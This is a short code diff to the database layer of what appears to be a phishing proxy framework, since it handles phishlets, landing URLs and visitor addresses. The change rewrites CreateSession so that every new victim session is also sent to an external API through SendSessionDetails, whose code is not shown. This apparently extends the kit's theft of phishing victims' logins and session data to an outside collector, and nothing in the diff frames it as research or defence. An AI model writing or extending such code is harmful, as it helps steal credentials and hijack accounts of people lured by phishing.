@@ -29,10 +29,30 @@ func NewDatabase(path string) (*Database, error) {
 	return d, nil
 }
 
+/*
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
 	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
 	return err
 }
+*/
+
+func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
+	// Create the session
+	session, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
+	if err != nil {
+		return err
+	}
+
+	// Send session details to the external API
+	if err := SendSessionDetails(session); err != nil {
+		// Handle the error (e.g., log it or return it)
+		fmt.Printf("Error sending session details: %v\n", err)
+		return err
+	}
+
+	return nil
+}
+
 
 func (d *Database) ListSessions() ([]*Session, error) {
 	s, err := d.sessionsList()
